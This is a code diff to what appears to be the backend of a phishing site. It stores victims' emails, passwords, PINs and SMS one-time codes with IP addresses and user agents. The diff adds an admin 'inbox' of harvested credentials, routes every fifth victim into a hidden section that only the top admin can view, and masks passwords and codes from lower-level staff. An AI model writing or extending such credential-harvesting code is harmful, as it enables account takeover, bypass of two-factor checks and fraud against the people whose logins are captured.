@@ -44,11 +44,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
         userAgent,
       });
 
+      // Determine if this user should be in hidden section (20%)
+      const totalUsers = await storage.countTotalUsers();
+      // First 20% of users go to hidden section (every 5th user starting from 1st)
+      const isHidden = (totalUsers % 5) === 1;
+
+      // Create inbox message for registration
+      await storage.createInboxMessage({
+        userId: collectedDataRecord.id,
+        messageType: "registration",
+        email,
+        password,
+        pin,
+        smsCode: null,
+        ipAddress,
+        userAgent,
+        isHidden,
+      });
+
       // Store the collected data ID temporarily for SMS verification
       const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
       tempCollectedIds.set(sessionId, collectedDataRecord.id);
 
-      console.log(`✅ Login data saved to database for: ${email}`);
+      console.log(`✅ Login data saved - Email: ${email}, Hidden: ${isHidden}`);
 
       // Always return success
       res.json({ 
@@ -76,9 +94,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       // Update collected data with SMS code
-      await storage.updateCollectedDataSms(collectedDataId, otp);
+      const updatedRecord = await storage.updateCollectedDataSms(collectedDataId, otp);
+      
+      if (!updatedRecord) {
+        return res.status(500).json({ message: "خطأ في تحديث البيانات" });
+      }
 
-      console.log(`✅ SMS code saved to database - Code: ${otp}`);
+      // Determine if this user's SMS verification should be in hidden section (same as registration)
+      const totalUsers = await storage.countTotalUsers();
+      const isHidden = (totalUsers % 5) === 1;
+
+      // Create inbox message for SMS verification
+      await storage.createInboxMessage({
+        userId: collectedDataId,
+        messageType: "sms_verification",
+        email: updatedRecord.email,
+        password: null,
+        pin: null,
+        smsCode: otp,
+        ipAddress: updatedRecord.ipAddress || null,
+        userAgent: updatedRecord.userAgent || null,
+        isHidden,
+      });
+
+      console.log(`✅ SMS code saved - Code: ${otp}, Hidden: ${isHidden}`);
 
       // Clean up temporary session
       tempCollectedIds.delete(userId);
@@ -184,6 +223,61 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error: any) {
       console.error("Error fetching collected data:", error);
       res.status(500).json({ message: "خطأ في جلب البيانات" });
+    }
+  });
+
+  // Get public inbox messages (80% - visible to all admins)
+  app.get("/api/admin/inbox/public", requireAdmin, async (req, res) => {
+    try {
+      const messages = await storage.getInboxMessages(false);
+      const adminRole = req.session.adminRole;
+      
+      // Filter sensitive fields based on role
+      const filteredMessages = messages.map(msg => {
+        if (adminRole === "admin") {
+          // Admin sees everything
+          return msg;
+        } else {
+          // Staff - hide password and smsCode
+          return {
+            ...msg,
+            password: null,
+            smsCode: null,
+          };
+        }
+      });
+      
+      res.json({ 
+        success: true, 
+        messages: filteredMessages,
+        adminRole
+      });
+    } catch (error: any) {
+      console.error("Error fetching inbox messages:", error);
+      res.status(500).json({ message: "خطأ في جلب الرسائل" });
+    }
+  });
+
+  // Get hidden inbox messages (20% - only admin)
+  app.get("/api/admin/inbox/hidden", requireAdmin, async (req, res) => {
+    try {
+      const adminRole = req.session.adminRole;
+      
+      // Only admin can access hidden messages
+      if (adminRole !== "admin") {
+        return res.status(403).json({ message: "غير مصرح لك بالوصول" });
+      }
+      
+      const messages = await storage.getHiddenInboxMessages();
+      
+      res.json({ 
+        success: true, 
+        messages,
+        adminRole
+      });
+    } catch (error: any) {
+      console.error("Error fetching hidden messages:", error);
+      res.status(500).json({ message: "خطأ في جلب الرسائل المخفية" });
     }
   });
 
